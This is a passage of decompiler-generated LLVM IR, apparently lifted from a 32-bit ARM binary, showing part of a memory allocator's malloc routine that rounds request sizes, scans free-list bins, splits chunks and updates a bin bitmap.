  store i32 65876, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10148)
  %v0_10154 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10154, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10160 = load i32, i32* inttoptr (i32 142980 to i32*), align 4
  store i32 %v4_10160, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1016c.427 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10160)
  %v0_1016c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1016c, -32
  br i1 %tmp, label %dec_label_pc_10188, label %dec_label_pc_10174

dec_label_pc_10174:                               ; preds = %dec_label_pc_10110
  %v0_10174 = call i32 @function_d0ec()
  store i32 %v0_10174, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_10180 = inttoptr i32 %v0_10174 to i32*
  store i32 12, i32* %v2_10180, align 4
  br label %dec_label_pc_10a04

dec_label_pc_10188:                               ; preds = %dec_label_pc_10110
  %v1_10188 = add i32 %v0_1016c, 11
  store i32 %v1_10188, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v2_10194 = icmp ugt i32 %v1_10188, 14
  %v7_10194 = icmp eq i32 %v1_10188, 15
  %v2_10198 = xor i1 %v7_10194, true
  %v3_10198 = and i1 %v2_10194, %v2_10198
  br i1 %v3_10198, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_10188
  %v5_10198 = and i32 %v1_10188, -8
  store i32 %v5_10198, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_10188, %bb
  %v4_1019c = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_1019c, i32* @r0, align 4
  %v1_101a0 = inttoptr i32 %v4_1019c to i32*
  %v2_101a0 = load i32, i32* %v1_101a0, align 4
  store i32 %v2_101a0, i32* @r4, align 4
  %v2_101a4 = xor i1 %v2_10194, true
  %v3_101a4 = or i1 %v7_10194, %v2_101a4
  br i1 %v3_101a4, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_101a8 = urem i32 %v2_101a0, 2
  %v2_101a8 = icmp eq i32 %v1_101a8, 0
  br i1 %v2_101a8, label %dec_label_pc_101b0, label %dec_label_pc_101c0

dec_label_pc_101b0:                               ; preds = %bb140
  %v2_101b0 = icmp eq i32 %v2_101a0, 0
  br i1 %v2_101b0, label %dec_label_pc_101b8, label %dec_label_pc_1059c

dec_label_pc_101b8:                               ; preds = %dec_label_pc_101b0
  %v0_101b8 = call i32 @function_10e94()
  store i32 %v0_101b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1059c

dec_label_pc_101c0:                               ; preds = %bb140
  %v0_101c0 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_101c0, %v2_101a0
  br i1 %tmp201, label %dec_label_pc_101e8, label %dec_label_pc_101c8

dec_label_pc_101c8:                               ; preds = %dec_label_pc_101c0
  %v1_101c8 = add i32 %v4_1019c, -4
  store i32 %v1_101c8, i32* %r1.global-to-local, align 4
  %v3_101cc = udiv i32 %v0_101c0, 8
  store i32 %v3_101cc, i32* %r2.global-to-local, align 4
  %v4_101d0 = mul nuw i32 %v3_101cc, 4
  %v5_101d0 = add i32 %v4_101d0, %v1_101c8
  %v6_101d0 = inttoptr i32 %v5_101d0 to i32*
  %v7_101d0 = load i32, i32* %v6_101d0, align 4
  store i32 %v7_101d0, i32* %r0.global-to-local, align 4
  %v2_101d4 = icmp eq i32 %v7_101d0, 0
  br i1 %v2_101d4, label %dec_label_pc_101e8, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_101c8
  %v2_101d8 = add i32 %v7_101d0, 8
  %v3_101d8 = inttoptr i32 %v2_101d8 to i32*
  %v4_101d8 = load i32, i32* %v3_101d8, align 4
  store i32 %v4_101d8, i32* %r3.global-to-local, align 4
  store i32 %v2_101d8, i32* %r0.global-to-local, align 4
  store i32 %v2_101d8, i32* %r4.global-to-local, align 4
  store i32 %v4_101d8, i32* %v6_101d0, align 4
  br label %dec_label_pc_109e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101c8, %dec_label_pc_101c0
  %tmp202 = icmp ugt i32 %v0_101c0, 255
  br i1 %tmp202, label %dec_label_pc_10238, label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101e8
  store i32 142964, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_101f8 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  %v3_101fc = udiv i32 %v0_101c0, 8
  store i32 %v3_101fc, i32* @r7, align 4
  %v4_10200 = mul nuw i32 %v3_101fc, 8
  %v5_10200 = add i32 %v4_101f8, %v4_10200
  store i32 %v5_10200, i32* %r3.global-to-local, align 4
  %v1_10204 = add i32 %v5_10200, 44
  store i32 %v1_10204, i32* %ip.global-to-local, align 4
  %v1_10208 = add i32 %v5_10200, 56
  %v2_10208 = inttoptr i32 %v1_10208 to i32*
  %v3_10208 = load i32, i32* %v2_10208, align 4
  store i32 %v3_10208, i32* %r0.global-to-local, align 4
  %v9_1020c = icmp eq i32 %v3_10208, %v1_10204
  br i1 %v9_1020c, label %dec_label_pc_10398, label %dec_label_pc_10214

dec_label_pc_10214:                               ; preds = %dec_label_pc_101f0
  %v2_10214 = add i32 %v3_10208, %v0_101c0
  store i32 %v2_10214, i32* %r3.global-to-local, align 4
  %v1_10218 = add i32 %v2_10214, 4
  %v2_10218 = inttoptr i32 %v1_10218 to i32*
  %v3_10218 = load i32, i32* %v2_10218, align 4
  store i32 %v3_10218, i32* %r2.global-to-local, align 4
  %v1_1021c = add i32 %v3_10208, 12
  %v2_1021c = inttoptr i32 %v1_1021c to i32*
  %v3_1021c = load i32, i32* %v2_1021c, align 4
  store i32 %v3_1021c, i32* %r1.global-to-local, align 4
  %v1_10220 = or i32 %v3_10218, 1
  store i32 %v1_10220, i32* %r2.global-to-local, align 4
  %v1_10224 = add i32 %v3_10208, 8
  store i32 %v1_10224, i32* %r4.global-to-local, align 4
  store i32 %v1_10220, i32* %v2_10218, align 4
  %v0_1022c = load i32, i32* %ip.global-to-local, align 4
  %v1_1022c = load i32, i32* %r1.global-to-local, align 4
  %v2_1022c = add i32 %v1_1022c, 8
  %v3_1022c = inttoptr i32 %v2_1022c to i32*
  store i32 %v0_1022c, i32* %v3_1022c, align 4
  %v0_10230 = load i32, i32* %r1.global-to-local, align 4
  %v1_10230 = load i32, i32* %ip.global-to-local, align 4
  %v2_10230 = add i32 %v1_10230, 12
  %v3_10230 = inttoptr i32 %v2_10230 to i32*
  store i32 %v0_10230, i32* %v3_10230, align 4
  br label %dec_label_pc_109e8

dec_label_pc_10238:                               ; preds = %dec_label_pc_101e8
  store i32 %v0_101c0, i32* %r0.global-to-local, align 4
  %v1_1023c = call i32 @function_10098(i32 %v0_101c0)
  store i32 %v1_1023c, i32* %r0.global-to-local, align 4
  %v0_10240 = load i32, i32* @r4, align 4
  %v1_10240 = and i32 %v0_10240, 2
  %v2_10240 = icmp eq i32 %v1_10240, 0
  store i32 %v1_1023c, i32* @r7, align 4
  br i1 %v2_10240, label %dec_label_pc_10398, label %dec_label_pc_1024c

dec_label_pc_1024c:                               ; preds = %dec_label_pc_10238
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10254 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10254, i32* @r0, align 4
  %v0_10258 = call i32 @function_10e94()
  store i32 %v0_10258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10398

dec_label_pc_10260:                               ; preds = %dec_label_pc_103ac
  %v1_10260 = add i32 %v3_103ac, 4
  %v2_10260 = inttoptr i32 %v1_10260 to i32*
  %v3_10260 = load i32, i32* %v2_10260, align 4
  store i32 %v3_10260, i32* %r3.global-to-local, align 4
  %v0_10264 = load i32, i32* @sl, align 4
  %v1_10268 = and i32 %v3_10260, -4
  store i32 %v1_10268, i32* %r4.global-to-local, align 4
  %v1_1026c = add i32 %v3_103ac, 12
  %v2_1026c = inttoptr i32 %v1_1026c to i32*
  %v3_1026c = load i32, i32* %v2_1026c, align 4
  store i32 %v3_1026c, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_10264, 255
  br i1 %tmp203, label %dec_label_pc_102c8, label %dec_label_pc_10274

dec_label_pc_10274:                               ; preds = %dec_label_pc_10260
  %v9_10274 = icmp eq i32 %v3_1026c, %v0_102cc
  br i1 %v9_10274, label %dec_label_pc_1027c, label %dec_label_pc_102c8

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10274
  %v0_1027c = load i32, i32* @sb, align 4
  %v1_1027c = add i32 %v0_1027c, 48
  %v2_1027c = inttoptr i32 %v1_1027c to i32*
  %v3_1027c = load i32, i32* %v2_1027c, align 4
  store i32 %v3_1027c, i32* %r3.global-to-local, align 4
  %v9_10280 = icmp eq i32 %v3_103ac, %v3_1027c
  br i1 %v9_10280, label %dec_label_pc_10288, label %dec_label_pc_102c8

dec_label_pc_10288:                               ; preds = %dec_label_pc_1027c
  %v1_10288 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_10268, %v1_10288
  br i1 %tmp204, label %dec_label_pc_10290, label %dec_label_pc_102c8

dec_label_pc_10290:                               ; preds = %dec_label_pc_10288
  %v2_10290 = sub i32 %v1_10268, %v0_10264
  store i32 %v2_10290, i32* %r2.global-to-local, align 4
  %v2_10294 = add i32 %v0_10264, %v3_103ac
  store i32 %v2_10294, i32* %r3.global-to-local, align 4
  %v1_10298 = or i32 %v0_10264, 1
  store i32 %v1_10298, i32* %r0.global-to-local, align 4
  %v1_1029c = or i32 %v2_10290, 1
  store i32 %v1_1029c, i32* %r1.global-to-local, align 4
  %v1_102a0 = add i32 %v3_103ac, 8
  store i32 %v1_102a0, i32* %r4.global-to-local, align 4
  %v2_102a4 = add i32 %v0_102cc, 8
  %v3_102a4 = inttoptr i32 %v2_102a4 to i32*
  store i32 %v2_10294, i32* %v3_102a4, align 4
  %v0_102a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_102a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_102a8 = add i32 %v1_102a8, 12
  %v3_102a8 = inttoptr i32 %v2_102a8 to i32*
  store i32 %v0_102a8, i32* %v3_102a8, align 4
  %v0_102ac = load i32, i32* %r0.global-to-local, align 4
  %v1_102ac = load i32, i32* @r6, align 4
  %v2_102ac = add i32 %v1_102ac, 4
  %v3_102ac = inttoptr i32 %v2_102ac to i32*
  store i32 %v0_102ac, i32* %v3_102ac, align 4
  %v0_102b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_102b0 = load i32, i32* @sb, align 4
  %v2_102b0 = add i32 %v1_102b0, 48
  %v3_102b0 = inttoptr i32 %v2_102b0 to i32*
  store i32 %v0_102b0, i32* %v3_102b0, align 4
  %v0_102b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_102b4 = load i32, i32* %r3.global-to-local, align 4
  %v3_102b4 = add i32 %v1_102b4, %v0_102b4
  %v4_102b4 = inttoptr i32 %v3_102b4 to i32*
  store i32 %v0_102b4, i32* %v4_102b4, align 4
  %v0_102b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_102b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_102b8 = add i32 %v1_102b8, 4
  %v3_102b8 = inttoptr i32 %v2_102b8 to i32*
  store i32 %v0_102b8, i32* %v3_102b8, align 4
  %v0_102bc = load i32, i32* %ip.global-to-local, align 4
  %v1_102bc = load i32, i32* %r3.global-to-local, align 4
  %v2_102bc = add i32 %v1_102bc, 12
  %v3_102bc = inttoptr i32 %v2_102bc to i32*
  store i32 %v0_102bc, i32* %v3_102bc, align 4
  %v0_102c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_102c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_102c0 = add i32 %v1_102c0, 8
  %v3_102c0 = inttoptr i32 %v2_102c0 to i32*
  store i32 %v0_102c0, i32* %v3_102c0, align 4
  br label %dec_label_pc_109e8

dec_label_pc_102c8:                               ; preds = %dec_label_pc_10288, %dec_label_pc_1027c, %dec_label_pc_10274, %dec_label_pc_10260
  %v9_102c8 = icmp eq i32 %v1_10268, %v0_10264
  %v2_102cc = add i32 %v3_1026c, 8
  %v3_102cc = inttoptr i32 %v2_102cc to i32*
  store i32 %v0_102cc, i32* %v3_102cc, align 4
  %v0_102d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_102d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_102d0 = add i32 %v1_102d0, 12
  %v3_102d0 = inttoptr i32 %v2_102d0 to i32*
  store i32 %v0_102d0, i32* %v3_102d0, align 4
  br i1 %v9_102c8, label %dec_label_pc_10428.loopexit, label %dec_label_pc_102e4

dec_label_pc_102e4:                               ; preds = %dec_label_pc_102c8
  %v0_102e4 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_102e4, 255
  br i1 %tmp205, label %dec_label_pc_10308, label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102e4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v1_102f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_102f0 = add i32 %v1_102f0, 142964
  %v3_102f0 = inttoptr i32 %v2_102f0 to i32*
  %v4_102f0 = load i32, i32* %v3_102f0, align 4
  %v3_102f4 = udiv i32 %v0_102e4, 8
  store i32 %v3_102f4, i32* %r0.global-to-local, align 4
  %v4_102f8 = mul nuw i32 %v3_102f4, 8
  %v5_102f8 = add i32 %v4_102f0, %v4_102f8
  store i32 %v5_102f8, i32* %r3.global-to-local, align 4
  %v1_102fc = add i32 %v5_102f8, 44
  store i32 %v1_102fc, i32* %ip.global-to-local, align 4
  %v1_10300 = add i32 %v5_102f8, 52
  %v2_10300 = inttoptr i32 %v1_10300 to i32*
  %v3_10300 = load i32, i32* %v2_10300, align 4
  store i32 %v3_10300, i32* @lr, align 4
  br label %dec_label_pc_10360

dec_label_pc_10308:                               ; preds = %dec_label_pc_102e4
  store i32 %v0_102e4, i32* %r0.global-to-local, align 4
  %v1_1030c = call i32 @function_10098(i32 %v0_102e4)
  store i32 %v1_1030c, i32* %r0.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v1_10314 = load i32, i32* %r8.global-to-local, align 4
  %v2_10314 = add i32 %v1_10314, 142964
  %v3_10314 = inttoptr i32 %v2_10314 to i32*
  %v4_10314 = load i32, i32* %v3_10314, align 4
  %v4_10318 = mul i32 %v1_1030c, 8
  %v5_10318 = add i32 %v4_10314, %v4_10318
  store i32 %v5_10318, i32* %r3.global-to-local, align 4
  %v1_1031c = add i32 %v5_10318, 44
  store i32 %v1_1031c, i32* %ip.global-to-local, align 4
  %v1_10320 = add i32 %v5_10318, 52
  %v2_10320 = inttoptr i32 %v1_10320 to i32*
  %v3_10320 = load i32, i32* %v2_10320, align 4
  store i32 %v3_10320, i32* @lr, align 4
  %v9_10324 = icmp eq i32 %v3_10320, %v1_1031c
  br i1 %v9_10324, label %dec_label_pc_10360, label %dec_label_pc_1032c

dec_label_pc_1032c:                               ; preds = %dec_label_pc_10308
  %v1_1032c = add i32 %v5_10318, 56
  %v2_1032c = inttoptr i32 %v1_1032c to i32*
  %v3_1032c = load i32, i32* %v2_1032c, align 4
  store i32 %v3_1032c, i32* %r1.global-to-local, align 4
  %v1_10330 = add i32 %v3_1032c, 4
  %v2_10330 = inttoptr i32 %v1_10330 to i32*
  %v3_10330 = load i32, i32* %v2_10330, align 4
  store i32 %v3_10330, i32* %r3.global-to-local, align 4
  %v0_10334 = load i32, i32* %r4.global-to-local, align 4
  %v3_10334 = icmp ult i32 %v0_10334, %v3_10330
  br i1 %v3_10334, label %.thread, label %dec_label_pc_10350.preheader

.thread:                                          ; preds = %dec_label_pc_1032c
  store i32 %v1_1031c, i32* @lr, align 4
  store i32 %v3_1032c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10360

dec_label_pc_10350.preheader:                     ; preds = %dec_label_pc_1032c
  %v2_1033c = or i32 %v0_10334, 1
  store i32 %v2_1033c, i32* %r2.global-to-local, align 4
  %v1_10350179 = add i32 %v3_10320, 4
  %v2_10350180 = inttoptr i32 %v1_10350179 to i32*
  %v3_10350181 = load i32, i32* %v2_10350180, align 4
  store i32 %v3_10350181, i32* %r3.global-to-local, align 4
  %v3_10354183 = icmp ult i32 %v2_1033c, %v3_10350181
  br i1 %v3_10354183, label %dec_label_pc_1034c, label %dec_label_pc_1035c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_10350.preheader, %dec_label_pc_1034c
  %v0_1035c184 = phi i32 [ %v3_1034c, %dec_label_pc_1034c ], [ %v3_10320, %dec_label_pc_10350.preheader ]
  %v1_1034c = add i32 %v0_1035c184, 8
  %v2_1034c = inttoptr i32 %v1_1034c to i32*
  %v3_1034c = load i32, i32* %v2_1034c, align 4
  store i32 %v3_1034c, i32* @lr, align 4
  %v1_10350 = add i32 %v3_1034c, 4
  %v2_10350 = inttoptr i32 %v1_10350 to i32*
  %v3_10350 = load i32, i32* %v2_10350, align 4
  store i32 %v3_10350, i32* %r3.global-to-local, align 4
  %v3_10354 = icmp ult i32 %v2_1033c, %v3_10350
  br i1 %v3_10354, label %dec_label_pc_1034c, label %dec_label_pc_1035c

dec_label_pc_1035c:                               ; preds = %dec_label_pc_1034c, %dec_label_pc_10350.preheader
  %v0_1035c.lcssa = phi i32 [ %v3_10320, %dec_label_pc_10350.preheader ], [ %v3_1034c, %dec_label_pc_1034c ]
  %v1_1035c = add i32 %v0_1035c.lcssa, 12
  %v2_1035c = inttoptr i32 %v1_1035c to i32*
  %v3_1035c = load i32, i32* %v2_1035c, align 4
  store i32 %v3_1035c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10360

dec_label_pc_10360:                               ; preds = %.thread, %dec_label_pc_10308, %dec_label_pc_102ec, %dec_label_pc_1035c
  %v0_10380 = phi i32 [ %v1_1031c, %dec_label_pc_10308 ], [ %v1_102fc, %dec_label_pc_102ec ], [ %v3_1035c, %dec_label_pc_1035c ], [ %v3_1032c, %.thread ]
  %v0_10374 = phi i32 [ %v1_1030c, %dec_label_pc_10308 ], [ %v3_102f4, %dec_label_pc_102ec ], [ %v1_1030c, %dec_label_pc_1035c ], [ %v1_1030c, %.thread ]
  %v1_10364 = phi i32 [ %v1_10314, %dec_label_pc_10308 ], [ %v1_102f0, %dec_label_pc_102ec ], [ %v1_10314, %dec_label_pc_1035c ], [ %v1_10314, %.thread ]
  store i32 142964, i32* %r2.global-to-local, align 4
  %v2_10364 = add i32 %v1_10364, 142964
  %v3_10364 = inttoptr i32 %v2_10364 to i32*
  %v4_10364 = load i32, i32* %v3_10364, align 4
  %v3_10368 = sdiv i32 %v0_10374, 32
  store i32 %v3_10368, i32* %r3.global-to-local, align 4
  %v4_1036c = mul nsw i32 %v3_10368, 4
  %v5_1036c = add i32 %v4_10364, %v4_1036c
  store i32 %v5_1036c, i32* %r1.global-to-local, align 4
  %v1_10370 = add i32 %v5_1036c, 820
  %v2_10370 = inttoptr i32 %v1_10370 to i32*
  %v3_10370 = load i32, i32* %v2_10370, align 4
  %v1_10374 = urem i32 %v0_10374, 32
  store i32 %v1_10374, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_1037c = shl i32 1, %v1_10374
  %v8_1037c = or i32 %v3_10370, %v7_1037c
  store i32 %v8_1037c, i32* %r3.global-to-local, align 4
  %v1_10380 = load i32, i32* @r6, align 4
  %v2_10380 = add i32 %v1_10380, 12
  %v3_10380 = inttoptr i32 %v2_10380 to i32*
  store i32 %v0_10380, i32* %v3_10380, align 4
  %v0_10384 = load i32, i32* @lr, align 4
  %v1_10384 = load i32, i32* @r6, align 4
  %v2_10384 = add i32 %v1_10384, 8
  %v3_10384 = inttoptr i32 %v2_10384 to i32*
  store i32 %v0_10384, i32* %v3_10384, align 4
  %v0_10388 = load i32, i32* %r3.global-to-local, align 4
  %v1_10388 = load i32, i32* %r1.global-to-local, align 4
  %v2_10388 = add i32 %v1_10388, 820
  %v3_10388 = inttoptr i32 %v2_10388 to i32*
  store i32 %v0_10388, i32* %v3_10388, align 4
  %v0_1038c = load i32, i32* @r6, align 4
  %v1_1038c = load i32, i32* @lr, align 4
  %v2_1038c = add i32 %v1_1038c, 12
  %v3_1038c = inttoptr i32 %v2_1038c to i32*
  store i32 %v0_1038c, i32* %v3_1038c, align 4
  %v0_10390 = load i32, i32* @r6, align 4
  %v1_10390 = load i32, i32* %ip.global-to-local, align 4
  %v2_10390 = add i32 %v1_10390, 8
  %v3_10390 = inttoptr i32 %v2_10390 to i32*
  store i32 %v0_10390, i32* %v3_10390, align 4
  %v0_103ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_103ac

dec_label_pc_10398:                               ; preds = %dec_label_pc_10238, %dec_label_pc_101f0, %dec_label_pc_1024c
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_103a0 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_103a0, i32* @sb, align 4
  %v0_103a4 = load i32, i32* @sl, align 4
  %v1_103a4 = add i32 %v0_103a4, 16
  store i32 %v1_103a4, i32* @fp, align 4
  %v1_103a8 = add i32 %v4_103a0, 52
  store i32 %v1_103a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_103ac

dec_label_pc_103ac:                               ; preds = %dec_label_pc_10360, %dec_label_pc_10398
  %v0_102cc = phi i32 [ %v0_103ac.pre, %dec_label_pc_10360 ], [ %v1_103a8, %dec_label_pc_10398 ]
  %v1_103ac = add i32 %v0_102cc, 12
  %v2_103ac = inttoptr i32 %v1_103ac to i32*
  %v3_103ac = load i32, i32* %v2_103ac, align 4
  store i32 %v3_103ac, i32* @r6, align 4
  %v9_103b0 = icmp eq i32 %v3_103ac, %v0_102cc
  br i1 %v9_103b0, label %dec_label_pc_103b8, label %dec_label_pc_10260

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103ac
  %v0_103b8 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_103b8, 256
  %v0_10470.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_103b8.dec_label_pc_10470_crit_edge, label %dec_label_pc_103c0

dec_label_pc_103b8.dec_label_pc_10470_crit_edge:  ; preds = %dec_label_pc_103b8
  %.pre200 = mul i32 %v0_10470.pre, 8
  br label %dec_label_pc_10470

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103b8
  %v4_103c0 = mul i32 %v0_10470.pre, 8
  %v5_103c0 = add i32 %v4_103c0, %v0_102cc
  store i32 %v5_103c0, i32* %r3.global-to-local, align 4
  %v1_103c4 = add i32 %v5_103c0, -8
  store i32 %v1_103c4, i32* %r1.global-to-local, align 4
  %v1_103c8 = add i32 %v5_103c0, 4
  %v2_103c8 = inttoptr i32 %v1_103c8 to i32*
  %storemerge.pre = load i32, i32* %v2_103c8, align 4
  br label %dec_label_pc_10468

dec_label_pc_103d0:                               ; preds = %dec_label_pc_10468
  %v1_103d0 = add i32 %v1_103f8, 4
  %v2_103d0 = inttoptr i32 %v1_103d0 to i32*
  %v3_103d0 = load i32, i32* %v2_103d0, align 4
  store i32 %v3_103d0, i32* %r3.global-to-local, align 4
  %v1_103d4 = and i32 %v3_103d0, -4
  store i32 %v1_103d4, i32* %r2.global-to-local, align 4
  %v3_103d8 = icmp ult i32 %v1_103d4, %v0_103b8
  %v1_103dc = add i32 %v1_103f8, 12
  %v2_103dc = inttoptr i32 %v1_103dc to i32*
  %v3_103dc = load i32, i32* %v2_103dc, align 4
  store i32 %v3_103dc, i32* %r0.global-to-local, align 4
  br i1 %v3_103d8, label %dec_label_pc_10468, label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %dec_label_pc_103d0
  %v1_103e4 = add i32 %v1_103f8, 8
  %v2_103e4 = inttoptr i32 %v1_103e4 to i32*
  %v3_103e4 = load i32, i32* %v2_103e4, align 4
  store i32 %v3_103e4, i32* %r1.global-to-local, align 4
  %v1_103e8 = add i32 %v3_103e4, 12
  %v2_103e8 = inttoptr i32 %v1_103e8 to i32*
  %v3_103e8 = load i32, i32* %v2_103e8, align 4
  store i32 %v3_103e8, i32* %r3.global-to-local, align 4
  %v9_103ec = icmp eq i32 %v3_103e8, %v1_103f8
  br i1 %v9_103ec, label %dec_label_pc_103f4, label %dec_label_pc_10400

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103e4
  %v1_103f4 = add i32 %v3_103dc, 8
  %v2_103f4 = inttoptr i32 %v1_103f4 to i32*
  %v3_103f4 = load i32, i32* %v2_103f4, align 4
  store i32 %v3_103f4, i32* %r3.global-to-local, align 4
  %v9_103f8 = icmp eq i32 %v3_103f4, %v1_103f8
  br i1 %v9_103f8, label %dec_label_pc_10404, label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %dec_label_pc_103e4, %dec_label_pc_103f4
  %v0_10400 = call i32 @function_112c4()
  store i32 %v0_10400, i32* %r0.global-to-local, align 4
  %v0_10404.pre = load i32, i32* @sl, align 4
  %v1_10404.pre = load i32, i32* @r2, align 4
  %v0_1040c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10404

dec_label_pc_10404:                               ; preds = %dec_label_pc_103f4, %dec_label_pc_10400
  %v1_1040c = phi i32 [ %v3_103dc, %dec_label_pc_103f4 ], [ %v0_10400, %dec_label_pc_10400 ]
  %v0_1040c = phi i32 [ %v3_103e4, %dec_label_pc_103f4 ], [ %v0_1040c.pre, %dec_label_pc_10400 ]
  %v1_10404 = phi i32 [ %v1_103d4, %dec_label_pc_103f4 ], [ %v1_10404.pre, %dec_label_pc_10400 ]
  %v0_10404 = phi i32 [ %v0_103b8, %dec_label_pc_103f4 ], [ %v0_10404.pre, %dec_label_pc_10400 ]
  %v2_10404 = sub i32 %v1_10404, %v0_10404
  store i32 %v2_10404, i32* %lr.global-to-local, align 4
  %v2_1040c = add i32 %v1_1040c, 8
  %v3_1040c = inttoptr i32 %v2_1040c to i32*
  store i32 %v0_1040c, i32* %v3_1040c, align 4
  %v0_10410 = load i32, i32* %r0.global-to-local, align 4
  %v1_10410 = load i32, i32* %r1.global-to-local, align 4
  %v2_10410 = add i32 %v1_10410, 12
  %v3_10410 = inttoptr i32 %v2_10410 to i32*
  store i32 %v0_10410, i32* %v3_10410, align 4
  %v0_10414 = load i32, i32* %ip.global-to-local, align 4
  %v1_10414 = add i32 %v0_10414, 8
  store i32 %v1_10414, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_10404, 15
  br i1 %tmp207, label %dec_label_pc_10434, label %dec_label_pc_1041c

dec_label_pc_1041c:                               ; preds = %dec_label_pc_10404
  %v1_1041c = load i32, i32* %r2.global-to-local, align 4
  %v2_1041c = add i32 %v1_1041c, %v0_10414
  store i32 %v2_1041c, i32* %r2.global-to-local, align 4
  %v1_10420 = add i32 %v2_1041c, 4
  %v2_10420 = inttoptr i32 %v1_10420 to i32*
  %v3_10420 = load i32, i32* %v2_10420, align 4
  store i32 %v3_10420, i32* %r3.global-to-local, align 4
  store i32 %v1_10414, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10428

dec_label_pc_10428.loopexit:                      ; preds = %dec_label_pc_102c8
  %v1_102d4 = load i32, i32* @r6, align 4
  %v2_102d4 = load i32, i32* @sl, align 4
  %v3_102d4 = add i32 %v2_102d4, %v1_102d4
  store i32 %v3_102d4, i32* %r2.global-to-local, align 4
  %v2_102d8 = add i32 %v3_102d4, 4
  %v3_102d8 = inttoptr i32 %v2_102d8 to i32*
  %v4_102d8 = load i32, i32* %v3_102d8, align 4
  store i32 %v4_102d8, i32* %r3.global-to-local, align 4
  %v2_102dc = add i32 %v1_102d4, 8
  store i32 %v2_102dc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10428

dec_label_pc_10428:                               ; preds = %.dec_label_pc_10428_crit_edge, %dec_label_pc_10428.loopexit, %dec_label_pc_1041c
  %v1_1042c = phi i32 [ %v4_10550, %.dec_label_pc_10428_crit_edge ], [ %v3_102d4, %dec_label_pc_10428.loopexit ], [ %v2_1041c, %dec_label_pc_1041c ]
  %v0_10428 = phi i32 [ %v7_10550, %.dec_label_pc_10428_crit_edge ], [ %v4_102d8, %dec_label_pc_10428.loopexit ], [ %v3_10420, %dec_label_pc_1041c ]
  %v1_10428 = or i32 %v0_10428, 1
  store i32 %v1_10428, i32* %r3.global-to-local, align 4
  %v2_1042c = add i32 %v1_1042c, 4
  %v3_1042c = inttoptr i32 %v2_1042c to i32*
  store i32 %v1_10428, i32* %v3_1042c, align 4
  br label %dec_label_pc_109e8

dec_label_pc_10434:                               ; preds = %dec_label_pc_10404
  %v1_10434 = load i32, i32* @sl, align 4
  %v2_10434 = add i32 %v1_10434, %v0_10414
  store i32 %v2_10434, i32* %r2.global-to-local, align 4
  %v1_10438 = or i32 %v1_10434, 1
  store i32 %v1_10438, i32* %r3.global-to-local, align 4
  %v0_1043c = load i32, i32* %lr.global-to-local, align 4
  %v1_1043c = or i32 %v0_1043c, 1
  store i32 %v1_1043c, i32* %r1.global-to-local, align 4
  store i32 %v1_10414, i32* %r4.global-to-local, align 4
